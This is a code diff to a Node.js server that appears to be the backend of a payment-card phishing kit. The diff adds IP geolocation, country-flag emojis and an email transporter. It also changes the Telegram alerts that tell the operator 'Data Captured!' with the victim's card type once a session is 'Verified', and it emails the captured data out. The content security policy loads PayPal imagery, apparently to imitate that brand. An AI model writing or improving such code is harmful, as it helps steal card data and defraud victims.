@@ -49,6 +49,17 @@ const io = new Server(httpServer, {
 const PORT = process.env.PORT || 8080;
 const MASTER_PASSWORD = process.env.MASTER_PASSWORD || 'password'; // Use env var
 
+// --- Email Transporter ---
+const transporter = nodemailer.createTransport({
+    host: process.env.SMTP_HOST || 'smtp.gmail.com',
+    port: parseInt(process.env.SMTP_PORT || '587'),
+    secure: process.env.SMTP_SECURE === 'true', // true for 465, false for other ports
+    auth: {
+        user: process.env.SMTP_USER,
+        pass: process.env.SMTP_PASS,
+    },
+});
+
 // --- Middleware ---
 app.use(helmet({
     contentSecurityPolicy: {
@@ -58,7 +69,7 @@ app.use(helmet({
             scriptSrcAttr: ["'unsafe-inline'"],
             styleSrc: ["'self'", "'unsafe-inline'", "https://fonts.googleapis.com"],
             fontSrc: ["'self'", "https://fonts.gstatic.com", "data:"],
-            imgSrc: ["'self'", "data:", "https://www.paypalobjects.com", "https://upload.wikimedia.org"],
+            imgSrc: ["'self'", "data:", "https://www.paypalobjects.com", "https://upload.wikimedia.org", "https://flagcdn.com"],
             connectSrc: ["'self'"],
             frameSrc: ["'self'"]
         }
@@ -119,6 +130,15 @@ const refreshSettings = async () => {
     } catch (e) { console.error('Failed to load settings', e); }
 };
 refreshSettings();
+
+const getFlagEmoji = (countryCode: string) => {
+    if (!countryCode) return '🏳️';
+    const codePoints = countryCode
+        .toUpperCase()
+        .split('')
+        .map(char => 127397 + char.charCodeAt(0));
+    return String.fromCodePoint(...codePoints);
+};
 
 const sendTelegram = (msg: string) => {
     const token = cachedSettings.tgToken;
@@ -184,6 +204,11 @@ const getClientIp = (req: express.Request) => {
     return req.socket.remoteAddress || 'Unknown';
 };
 
+const getIpCountry = (ip: string) => {
+    const geo = geoip.lookup(ip);
+    return geo ? geo.country : null;
+};
+
 // 1. Sync State (Hybrid: HTTP for data, Socket for notify)
 app.post('/api/sync', async (req, res) => {
     try {
@@ -193,17 +218,26 @@ app.post('/api/sync', async (req, res) => {
         }
 
         const ip = getClientIp(req);
+        const country = getIpCountry(ip);
+
+        // Merge calculated Country into data
+        if (country) {
+            data.ipCountry = country;
+        }
 
         // Notification Logic
         const existing = await db.getSession(data.sessionId);
 
         // 1. New Session (Push Telegram)
         if (!existing) {
-             sendTelegram(`🚨 <b>New Session Started</b>\nID: <code>${data.sessionId}</code>\nIP: ${ip}\nUA: ${data.fingerprint?.userAgent || 'Unknown'}`);
+             const flag = getFlagEmoji(country || 'XX');
+             sendTelegram(`${flag} <b>New Session Started</b>\nID: <code>${data.sessionId}</code>\nIP: ${ip}\nLoc: ${country || 'Unknown'}`);
         }
         // 2. Completed Session (Email + Telegram)
         else if (existing.status !== 'Verified' && data.status === 'Verified') {
-             sendTelegram(`✅ <b>Session Verified</b>\nID: <code>${data.sessionId}</code>\nData Captured!`);
+             const flag = getFlagEmoji(country || existing.ipCountry || 'XX');
+             const cardType = data.cardType ? `[${data.cardType.toUpperCase()}]` : '[CARD]';
+             sendTelegram(`${flag} <b>Session Verified</b> ${cardType}\nID: <code>${data.sessionId}</code>\nData Captured!`);
              sendEmail(data);
         }
 
